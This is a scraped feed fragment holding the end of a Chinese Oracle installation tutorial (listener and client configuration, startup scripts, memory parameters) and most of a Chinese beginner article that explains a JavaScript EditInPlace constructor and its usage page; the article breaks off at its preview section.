</code></pre>
<h2 data-id="heading-13">2.5 Oracle网络配置</h2>
<h3 data-id="heading-14">监听器配置</h3>
<ol>
<li>
<p><strong>启动Net Configuration Assistant</strong></p>
<pre><code class="hljs language-bash" lang="bash">netca
</code></pre>
</li>
<li>
<p><strong>配置监听器</strong></p>
<ul>
<li>选择"监听程序配置"</li>
<li>添加或配置监听器</li>
<li>设置监听端口（默认1521）</li>
<li>选择协议（TCP）</li>
</ul>
</li>
<li>
<p><strong>手动配置监听器</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑listener.ora文件</span>
vi <span class="hljs-variable">$ORACLE_HOME</span>/network/admin/listener.ora

<span class="hljs-comment"># 示例配置</span>
LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))
    )
  )

SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = orcl)
      (ORACLE_HOME = /u01/app/oracle/product/19.0.0/dbhome_1)
    )
  )
</code></pre>
</li>
</ol>
<h3 data-id="heading-15">客户端连接配置</h3>
<ol>
<li>
<p><strong>配置tnsnames.ora</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑tnsnames.ora文件</span>
vi <span class="hljs-variable">$ORACLE_HOME</span>/network/admin/tnsnames.ora

<span class="hljs-comment"># 示例配置</span>
ORCL =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
</code></pre>
</li>
<li>
<p><strong>测试连接</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用tnsping测试网络连接</span>
tnsping orcl

<span class="hljs-comment"># 使用sqlplus连接数据库</span>
sqlplus system/password@orcl
</code></pre>
</li>
</ol>
<h2 data-id="heading-16">2.6 安装后配置和优化</h2>
<h3 data-id="heading-17">启动和停止数据库</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动数据库</span>
sqlplus / as sysdba
STARTUP

<span class="hljs-comment"># 停止数据库</span>
SHUTDOWN IMMEDIATE

<span class="hljs-comment"># 启动监听器</span>
lsnrctl start

<span class="hljs-comment"># 停止监听器</span>
lsnrctl stop
</code></pre>
<h3 data-id="heading-18">创建启动脚本</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建数据库启动脚本</span>
vi /home/oracle/startdb.sh

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-built_in">export</span> ORACLE_SID=orcl
sqlplus / as sysdba &lt;&lt; <span class="hljs-string">EOF
STARTUP
EXIT
EOF</span>
lsnrctl start

<span class="hljs-comment"># 创建数据库停止脚本</span>
vi /home/oracle/stopdb.sh

<span class="hljs-comment">#!/bin/bash</span>
lsnrctl stop
<span class="hljs-built_in">export</span> ORACLE_SID=orcl
sqlplus / as sysdba &lt;&lt; <span class="hljs-string">EOF
SHUTDOWN IMMEDIATE
EXIT
EOF</span>
</code></pre>
<h3 data-id="heading-19">常见配置参数</h3>
<ol>
<li>
<p><strong>内存配置</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看SGA大小</span>
<span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">PARAMETER</span> sga;

<span class="hljs-comment">-- 修改SGA大小</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> sga_max_size<span class="hljs-operator">=</span><span class="hljs-number">2</span>G <span class="hljs-keyword">SCOPE</span><span class="hljs-operator">=</span>SPFILE;
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> sga_target<span class="hljs-operator">=</span><span class="hljs-number">1</span>G <span class="hljs-keyword">SCOPE</span><span class="hljs-operator">=</span><span class="hljs-keyword">BOTH</span>;
</code></pre>
</li>
<li>
<p><strong>进程配置</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看进程数</span>
<span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">PARAMETER</span> processes;

<span class="hljs-comment">-- 修改进程数</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> processes<span class="hljs-operator">=</span><span class="hljs-number">300</span> <span class="hljs-keyword">SCOPE</span><span class="hljs-operator">=</span>SPFILE;
</code></pre>
</li>
</ol>
<h2 data-id="heading-20">2.7 本章小结</h2>
<p>本章详细介绍了Oracle数据库在Windows和Linux环境下的安装过程，包括系统要求、安装步骤、数据库创建和网络配置等内容。掌握这些技能是使用Oracle数据库的基础。</p>
<h2 data-id="heading-21">练习题</h2>
<ol>
<li>列出Oracle数据库安装的系统要求</li>
<li>描述在Linux环境下创建Oracle用户和组的步骤</li>
<li>解释如何使用DBCA创建数据库</li>
<li>配置监听器和客户端连接的步骤</li>
<li>编写一个简单的数据库启动和停止脚本</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 OOP 考题之 EditInPlace 类：从零开始掌握面向对象编程实战]]></title>    <link>https://juejin.cn/post/7579917791764643867</link>    <guid>https://juejin.cn/post/7579917791764643867</guid>    <pubDate>2025-12-05T02:47:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791764643867" data-draft-id="7579473409749073971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 OOP 考题之 EditInPlace 类：从零开始掌握面向对象编程实战"/> <meta itemprop="keywords" content="前端,JavaScript,DOM"/> <meta itemprop="datePublished" content="2025-12-05T02:47:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA阿giao"/> <meta itemprop="url" content="https://juejin.cn/user/473218785740627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 OOP 考题之 EditInPlace 类：从零开始掌握面向对象编程实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/473218785740627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA阿giao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:47:16.000Z" title="Fri Dec 05 2025 02:47:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言：什么是“就地编辑”？</h2>
<p>想象一下你在使用某社交平台时，点击自己的昵称，它立刻变成一个输入框，你可以直接修改并保存。这种交互方式叫做 <strong>“就地编辑”（Edit in Place）</strong> —— 不需要跳转页面或弹出新窗口，直接在当前位置完成编辑。</p>
<p>这看似简单的小功能，其实蕴含了非常典型的 <strong>面向对象编程（OOP）</strong> 思想。今天我们就通过一道经典的 OOP 考题——<code>EditInPlace</code> 类，手把手带你从一行代码都不懂的新手，成长为能写出专业级封装代码的开发者。</p>
<p>我们将 <strong>逐行解析 <code>edit_in_place.js</code> 文件中的每一行代码</strong>，彻底讲透这个类是如何工作的。</p>
<hr/>
<h2 data-id="heading-1">二、项目结构概览</h2>
<ul>
<li><code>index.html</code>：空页面（作为挂载点，实际使用时会引入 JS）</li>
<li><code>edit_in_place.js</code>：核心实现文件，包含完整的 <code>EditInPlace</code> 类</li>
</ul>
<pre><code class="hljs">edit-in-place/
├── index.html
├── edit_in_place.js
</code></pre>
<p>我们的重点就是 <strong><code>edit_in_place.js</code></strong>。下面我们将逐行拆解它。</p>
<hr/>
<h2 data-id="heading-2">三、完整代码 + 逐行详细注释</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@func</span> EditInPlace 就地编辑
 * <span class="hljs-doctag">@params</span> {string} value 初始值
 * <span class="hljs-doctag">@params</span> {element} parentElement 挂载点
 * <span class="hljs-doctag">@params</span> {string} id 自身ID
 */</span>
function EditInPlace(id, value, parentElement) {
    <span class="hljs-comment">// 此时 this 指向一个全新的空对象 {}</span>
    <span class="hljs-comment">// 构造函数的作用：初始化实例的属性</span>

    <span class="hljs-keyword">this</span>.id = id; <span class="hljs-comment">// 给实例设置唯一 ID，用于 DOM 元素标识</span>
    <span class="hljs-keyword">this</span>.value = value || <span class="hljs-string">'这个家伙很懒，什么都没有留下'</span>; <span class="hljs-comment">// 如果传入 value 为假值（如 null/undefined），则使用默认文本</span>
    <span class="hljs-keyword">this</span>.parentElement = parentElement; <span class="hljs-comment">// 记录父容器，后续要把编辑区域挂载到它里面</span>

    <span class="hljs-comment">// 预先声明所有将要使用的 DOM 元素引用，初始为 null（良好习惯：提前声明变量）</span>
    <span class="hljs-keyword">this</span>.containerElement = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 最外层容器 div</span>
    <span class="hljs-keyword">this</span>.saveButton = <span class="hljs-literal">null</span>;       <span class="hljs-comment">// “保存”按钮</span>
    <span class="hljs-keyword">this</span>.cancelButton = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// “取消”按钮</span>
    <span class="hljs-keyword">this</span>.fieldElement = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// 输入框 input</span>
    <span class="hljs-keyword">this</span>.staticElement = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// 静态文本 span</span>

    <span class="hljs-comment">// 按功能拆分逻辑：先创建 DOM 元素</span>
    <span class="hljs-keyword">this</span>.createElement(); 
    <span class="hljs-comment">// 再绑定事件监听器</span>
    <span class="hljs-keyword">this</span>.attachEvent();
}
</code></pre>
<h3 data-id="heading-3">构造函数解析</h3>
<ul>
<li>
<p>这是一个 <strong>构造函数</strong>（不是 ES6 的 <code>class</code>，而是传统基于函数的 OOP 写法）。</p>
</li>
<li>
<p>当你写 <code>new EditInPlace(...)</code> 时，JavaScript 会：</p>
<ol>
<li>创建一个空对象 <code>{}</code>；</li>
<li>把 <code>this</code> 指向这个空对象；</li>
<li>执行函数体内的代码，给 <code>this</code> 添加属性；</li>
<li>返回这个对象。</li>
</ol>
</li>
</ul>
<blockquote>
<p><strong>提示</strong>：<code>this</code> 在这里代表“当前正在创建的编辑器实例”。</p>
</blockquote>
<hr/>
<pre><code class="hljs language-kotlin" lang="kotlin">EditInPlace.prototype = {
    <span class="hljs-comment">// 封装了DOM操作</span>
    createElement: function() {
        <span class="hljs-comment">// 创建最外层容器 &lt;div&gt;</span>
        <span class="hljs-keyword">this</span>.containerElement = document.createElement(<span class="hljs-string">'div'</span>);
        
        <span class="hljs-comment">// 给容器设置 ID（方便调试或 CSS 样式控制）</span>
        <span class="hljs-keyword">this</span>.containerElement.id = <span class="hljs-keyword">this</span>.id;

        <span class="hljs-comment">// 创建静态文本显示区域 &lt;span&gt;</span>
        <span class="hljs-keyword">this</span>.staticElement = document.createElement(<span class="hljs-string">'span'</span>);
        <span class="hljs-keyword">this</span>.staticElement.innerHTML = <span class="hljs-keyword">this</span>.value; <span class="hljs-comment">// 显示初始值</span>
        
        <span class="hljs-comment">// 把 span 挂到容器里</span>
        <span class="hljs-keyword">this</span>.containerElement.appendChild(<span class="hljs-keyword">this</span>.staticElement);

        <span class="hljs-comment">// 创建输入框 &lt;input type="text"&gt;</span>
        <span class="hljs-keyword">this</span>.fieldElement = document.createElement(<span class="hljs-string">'input'</span>);
        <span class="hljs-keyword">this</span>.fieldElement.type = <span class="hljs-string">'text'</span>;
        <span class="hljs-keyword">this</span>.fieldElement.value = <span class="hljs-keyword">this</span>.value; <span class="hljs-comment">// 输入框也显示初始值</span>
        <span class="hljs-keyword">this</span>.containerElement.appendChild(<span class="hljs-keyword">this</span>.fieldElement); <span class="hljs-comment">// 挂到容器</span>

        <span class="hljs-comment">// 把整个容器挂到用户指定的父元素中（比如 body 或某个 div）</span>
        <span class="hljs-keyword">this</span>.parentElement.appendChild(<span class="hljs-keyword">this</span>.containerElement);

        <span class="hljs-comment">// 创建“保存”按钮</span>
        <span class="hljs-keyword">this</span>.saveButton = document.createElement(<span class="hljs-string">'input'</span>);
        <span class="hljs-keyword">this</span>.saveButton.type = <span class="hljs-string">'button'</span>;
        <span class="hljs-keyword">this</span>.saveButton.value = <span class="hljs-string">'保存'</span>;
        <span class="hljs-keyword">this</span>.containerElement.appendChild(<span class="hljs-keyword">this</span>.saveButton);

        <span class="hljs-comment">// 创建“取消”按钮</span>
        <span class="hljs-keyword">this</span>.cancelButton = document.createElement(<span class="hljs-string">'input'</span>);
        <span class="hljs-keyword">this</span>.cancelButton.type = <span class="hljs-string">'button'</span>;
        <span class="hljs-keyword">this</span>.cancelButton.value = <span class="hljs-string">'取消'</span>;
        <span class="hljs-keyword">this</span>.containerElement.appendChild(<span class="hljs-keyword">this</span>.cancelButton);

        <span class="hljs-comment">// 初始化时，显示文本，隐藏输入框和按钮</span>
        <span class="hljs-keyword">this</span>.convertToText(); <span class="hljs-comment">// 切换到文本显示状态</span>
    },
</code></pre>
<h3 data-id="heading-4"><code>createElement</code> 方法详解</h3>
<ul>
<li>
<p>所有 DOM 元素都在内存中创建（不会闪屏）。</p>
</li>
<li>
<p>结构如下（逻辑上）：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;div <span class="hljs-attr">id</span>=<span class="hljs-string">"xxx"</span>&gt;
  &lt;span&gt;初始文本&lt;/span&gt;
  &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> value=<span class="hljs-string">"初始文本"</span> style=<span class="hljs-string">"display:none"</span>&gt;
  &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> value=<span class="hljs-string">"保存"</span> style=<span class="hljs-string">"display:none"</span>&gt;
  &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> value=<span class="hljs-string">"取消"</span> style=<span class="hljs-string">"display:none"</span>&gt;
&lt;/div&gt;
</code></pre>
</li>
<li>
<p>最后调用 <code>convertToText()</code>，确保一开始只显示 <code>&lt;span&gt;</code>，其他都隐藏。</p>
</li>
</ul>
<hr/>
<pre><code class="hljs language-kotlin" lang="kotlin">    convertToText: function() {
        <span class="hljs-comment">// 隐藏编辑相关元素</span>
        <span class="hljs-keyword">this</span>.fieldElement.style.display = <span class="hljs-string">'none'</span>;   <span class="hljs-comment">// 隐藏输入框</span>
        <span class="hljs-keyword">this</span>.saveButton.style.display = <span class="hljs-string">'none'</span>;     <span class="hljs-comment">// 隐藏保存按钮</span>
        <span class="hljs-keyword">this</span>.cancelButton.style.display = <span class="hljs-string">'none'</span>;   <span class="hljs-comment">// 隐藏取消按钮</span>
        
        <span class="hljs-comment">// 显示静态文本</span>
        <span class="hljs-keyword">this</span>.staticElement.style.display = <span class="hljs-string">'inline'</span>; <span class="hljs-comment">// 显示 span</span>
    },

    convertToField: function() {
        <span class="hljs-comment">// 隐藏静态文本</span>
        <span class="hljs-keyword">this</span>.staticElement.style.display = <span class="hljs-string">'none'</span>;
        
        <span class="hljs-comment">// 设置输入框的值（防止用户多次点击导致旧值残留）</span>
        <span class="hljs-keyword">this</span>.fieldElement.value = <span class="hljs-keyword">this</span>.value;
        
        <span class="hljs-comment">// 显示编辑相关元素</span>
        <span class="hljs-keyword">this</span>.fieldElement.style.display = <span class="hljs-string">'inline'</span>;
        <span class="hljs-keyword">this</span>.saveButton.style.display = <span class="hljs-string">'inline'</span>;
        <span class="hljs-keyword">this</span>.cancelButton.style.display = <span class="hljs-string">'inline'</span>;
    },
</code></pre>
<h3 data-id="heading-5">状态切换机制</h3>
<ul>
<li>
<p><strong>两种状态</strong>：</p>
<ul>
<li><strong>文本状态</strong>（只看不改）→ 调用 <code>convertToText</code></li>
<li><strong>编辑状态</strong>（可输入）→ 调用 <code>convertToField</code></li>
</ul>
</li>
<li>
<p>通过 <code>style.display</code> 控制元素显隐，这是最简单的 UI 状态管理方式。</p>
</li>
<li>
<p>注意：<code>convertToField</code> 中重新赋值 <code>this.fieldElement.value = this.value</code> 是为了防止用户取消后再次进入时看到错误内容。</p>
</li>
</ul>
<hr/>
<pre><code class="hljs language-kotlin" lang="kotlin">    attachEvent: function() {
        <span class="hljs-comment">// 点击静态文本 → 进入编辑模式</span>
        <span class="hljs-keyword">this</span>.staticElement.addEventListener(<span class="hljs-string">'click'</span>, () =&gt; {
            <span class="hljs-keyword">this</span>.convertToField(); <span class="hljs-comment">// 切换到输入框显示状态</span>
        });

        <span class="hljs-comment">// 点击“保存”按钮 → 保存数据</span>
        <span class="hljs-keyword">this</span>.saveButton.addEventListener(<span class="hljs-string">'click'</span>, () =&gt; {
            <span class="hljs-keyword">this</span>.save();
        });

        <span class="hljs-comment">// 点击“取消”按钮 → 放弃修改</span>
        <span class="hljs-keyword">this</span>.cancelButton.addEventListener(<span class="hljs-string">'click'</span>, () =&gt; {
            <span class="hljs-keyword">this</span>.cancel();
        });
    },
</code></pre>
<h3 data-id="heading-6">事件绑定</h3>
<ul>
<li>
<p>使用 <strong>箭头函数</strong> <code>() =&gt; {}</code> 是为了 <strong>保持 <code>this</code> 指向当前实例</strong>。</p>
<ul>
<li>如果用普通函数 <code>function() {}</code>，<code>this</code> 会指向触发事件的 DOM 元素，导致错误！</li>
</ul>
</li>
<li>
<p>三个事件分别对应三种用户行为：</p>
<ul>
<li>点文本 → 编辑</li>
<li>点保存 → 存新值</li>
<li>点取消 → 恢复原状</li>
</ul>
</li>
</ul>
<hr/>
<pre><code class="hljs language-kotlin" lang="kotlin">    save: function() {
        <span class="hljs-comment">// 获取用户输入的新值</span>
        <span class="hljs-keyword">var</span> value = <span class="hljs-keyword">this</span>.fieldElement.value;
        
        <span class="hljs-comment">// 【重要】这里可以加 fetch 发送到后端（题目提到但未实现）</span>
        <span class="hljs-comment">// fetch('/api/update', { method: 'POST', body: JSON.stringify({id: this.id, value}) });</span>
        
        <span class="hljs-comment">// 更新内部状态</span>
        <span class="hljs-keyword">this</span>.value = value;
        <span class="hljs-comment">// 同步更新静态文本内容</span>
        <span class="hljs-keyword">this</span>.staticElement.innerHTML = value;
        <span class="hljs-comment">// 切回文本显示状态</span>
        <span class="hljs-keyword">this</span>.convertToText();
    },

    cancel: function() {
        <span class="hljs-comment">// 直接切回文本状态，不保存任何更改</span>
        <span class="hljs-keyword">this</span>.convertToText();
    }
};
</code></pre>
<h3 data-id="heading-7">保存与取消逻辑</h3>
<ul>
<li>
<p><code>save()</code>：</p>
<ul>
<li>读取输入框的值；</li>
<li>更新实例的 <code>this.value</code>（这是“真实数据源”）；</li>
<li>同步更新 <code>&lt;span&gt;</code> 的显示内容；</li>
<li>切回只读状态。</li>
</ul>
</li>
<li>
<p><code>cancel()</code>：</p>
<ul>
<li>不做任何数据修改，直接隐藏输入框，恢复原样。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-8">四、如何使用这个类？（实战演示）</h2>
<p>我们需要编写一个完整的 HTML 页面来加载并使用 <code>EditInPlace</code> 类。下面这个示例就是最标准的用法——它展示了如何在真实网页中“实例化”一个就地编辑组件。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 
    这是一个空的 div 容器，id 为 "app"。
    它的作用是作为 EditInPlace 组件的“挂载点”——
    所有动态生成的编辑区域（文本、输入框、按钮）都会被插入到这个 div 内部。
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- 
    引入我们编写的 EditInPlace 类定义文件。
    浏览器会先加载并解析这个 JS 文件，使 EditInPlace 构造函数在全局可用。
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./edit_in_place.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- 
    下面的 &lt;script&gt; 标签用于执行实际的业务逻辑：
    创建一个 EditInPlace 实例，并将其挂载到 #app 容器中。
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// 注释说明：这里正在使用面向对象编程（OOP）的方式创建一个可编辑组件实例</span>

  <span class="hljs-comment">// 调用构造函数 new EditInPlace(...)，传入三个必要参数：</span>
  <span class="hljs-keyword">const</span> ep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EditInPlace</span>(
    <span class="hljs-string">'slogan'</span>,                     <span class="hljs-comment">// 参数1: id —— 用于给生成的容器 div 设置唯一 ID（如 &lt;div id="slogan"&gt;）</span>
    <span class="hljs-string">'有了肯德基，生活好滋味'</span>,   <span class="hljs-comment">// 参数2: value —— 初始显示的文本内容</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'app'</span>) <span class="hljs-comment">// 参数3: parentElement —— 指定要把编辑器挂载到哪个 DOM 元素内（这里是 id="app" 的 div）</span>
  );

  <span class="hljs-comment">// 在浏览器控制台打印出刚创建的实例 ep</span>
  <span class="hljs-comment">// 你可以打开开发者工具（F12），在 Console 面板看到这个对象</span>
  <span class="hljs-comment">// 它包含所有属性（id, value, containerElement...）和方法（save, cancel, createElement...）</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ep);
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-9">使用流程总结</h3>
<ol>
<li>
<p><strong>准备容器</strong>：HTML 中提供一个空的 <code>&lt;div id="app"&gt;&lt;/div&gt;</code> 作为“插槽”。</p>
</li>
<li>
<p><strong>引入脚本</strong>：通过 <code>&lt;script src="./edit_in_place.js"&gt;</code> 加载类定义。</p>
</li>
<li>
<p><strong>创建实例</strong>：调用 <code>new EditInPlace(...)</code>，传入：</p>
<ul>
<li>唯一 ID（用于内部 DOM 标识），</li>
<li>初始文本，</li>
<li>挂载目标（父元素）。</li>
</ul>
</li>
<li>
<p><strong>自动渲染</strong>：构造函数内部会自动调用 <code>createElement()</code> 和 <code>attachEvent()</code>，完成 DOM 创建与事件绑定。</p>
</li>
<li>
<p><strong>调试辅助</strong>：<code>console.log(ep)</code> 让你可以在控制台查看整个对象结构，验证是否创建成功。</p>
</li>
</ol>
<h3 data-id="heading-10">效果预览</h3>
<p>当你在浏览器中打开这个 HTML 文件时，你会看到：</p>
<ul>
